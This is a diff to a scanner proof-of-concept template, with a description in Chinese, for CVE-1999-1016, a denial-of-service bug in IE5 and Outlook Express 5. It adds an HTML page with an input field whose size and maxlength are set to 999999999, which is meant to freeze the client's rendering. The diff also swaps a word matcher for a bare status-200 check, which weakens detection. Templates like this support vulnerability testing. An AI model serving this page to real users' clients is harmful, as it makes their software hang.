@@ -1,10 +1,10 @@
 [info]
-author = "AVE"
-description = "通过构造包含超大HTML表单字段（size/maxlength=99999999）的页面，导致IE5/Outlook Express 5等使用Microsoft HTML控件的应用程序CPU占用100%无响应"
+author = "ave"
+description = "验证目标 IE5/FrontPage Express/Outlook Express 5 等使用 MS HTML 控件的客户端是否受 CVE-1999-1016 拒绝服务漏洞影响。构造包含超大 HTML 表单字段（如表格单元格中超大尺寸 text 输入框）的恶意 HTML 页面，若目标解析渲染时 CPU 飙升至 100% 或进程挂起，则判定存在漏洞。本 PoC 以安全无损方式渲染页面以触发异常占用，不造成持久破坏。"
 id = "POC-AVE-1999-0866"
-name = "CVE-1999-1016 PoC"
+name = "CVE-1999-1016 Internet Explorer 5 HTML Form Control DoS PoC"
 severity = "medium"
-tags = ["cve-1999-1016"]
+tags = ["ave-1999-0866"]
 vuln_id = [
     "CVE-1999-1016",
     "AVE-1999-0866",
@@ -15,15 +15,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/ie5-dos.html"
+path = "/cve-1999-1016-poc.html"
 protocol = "http"
 
 [poc.requests.body]
-content = ""
+content = '<!DOCTYPE html><html><head><title>CVE-1999-1016 PoC</title></head><body><table><tr><td><input type="text" size="999999999" maxlength="999999999" value="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"></td></tr></table></body></html>'
 type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = ["NeonBunny"]
+status = [200]
+type = "status"
